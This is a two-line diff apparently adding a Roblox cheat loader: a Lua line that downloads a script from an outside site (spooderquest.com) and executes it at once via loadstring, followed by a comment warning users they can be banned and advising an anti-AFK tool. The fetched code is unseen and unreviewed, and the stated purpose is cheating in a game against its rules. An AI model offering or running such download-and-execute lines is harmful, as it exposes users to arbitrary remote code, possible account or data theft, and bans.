@@ -1,0 +1,2 @@
+loadstring(game:HttpGet('http://spooderquest.com/Scripts/spooderburg.lua', true))()
+-- Guys be careful using this you can get ban, also use a anti afk 
